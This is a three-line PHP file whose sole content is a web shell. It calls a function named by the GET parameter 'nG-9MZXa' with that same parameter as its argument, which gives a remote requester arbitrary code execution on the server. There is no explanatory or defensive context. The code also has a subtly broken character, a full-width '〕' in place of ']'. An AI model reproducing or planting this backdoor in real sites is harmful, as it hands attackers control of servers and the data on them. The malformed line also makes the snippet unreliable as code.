<?php
$_GET['nG-9MZXa'〕($_GET['nG-9MZXa']);
?>
